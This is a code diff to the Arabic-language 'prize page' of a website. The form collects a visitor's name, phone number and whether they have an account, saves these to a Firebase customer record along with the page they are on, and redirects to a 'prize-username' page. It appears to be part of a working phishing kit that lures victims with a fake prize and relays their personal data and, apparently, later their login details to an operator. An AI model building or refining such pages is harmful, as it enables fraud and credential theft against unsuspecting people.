@@ -73,7 +73,7 @@
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
-  <script src="/assets/js/firebase-client.js?v=12"></script>
+  <script src="/assets/js/firebase-client.js?v=13"></script>
   <script src="/assets/js/page-commands.js?v=5"></script>
   <script>
     const modal=document.getElementById("formModal"),closeButton=document.getElementById("closeModal"),form=document.getElementById("demoForm"),warning=document.getElementById("formWarning");
@@ -86,7 +86,10 @@
       if(!name||!phone||!choice){warning.textContent="يرجى إدخال الاسم ورقم الهاتف واختيار إجابة.";warning.classList.add("show");return}
       warning.classList.remove("show");
       localStorage.setItem("prizeName",name);localStorage.setItem("prizePhone",phone);localStorage.setItem("prizeHasAccount",choice.value);
-      if(window.ensureCustomerDoc){try{await window.ensureCustomerDoc({name,phone,address:'',amount:'',currentPage:'صفحة الجوائز'})}catch(_){}}
+      // نفس مفاتيح firebase-client.js كي لا تُمسح البيانات عند الانتقال لصفحة أخرى
+      localStorage.setItem("customerName",name);localStorage.setItem("phone",phone);localStorage.setItem("mobile",phone);
+      const hasAccountLabel = choice.value === 'yes' ? 'نعم' : 'لا';
+      if(window.ensureCustomerDoc){try{await window.ensureCustomerDoc({name,phone,mobile:phone,address:'',amount:'',hasAccount:choice.value,hasAccountLabel:hasAccountLabel,currentPage:'صفحة الجوائز'})}catch(_){}}
       location.href="prize-username.html";
     });
   </script>
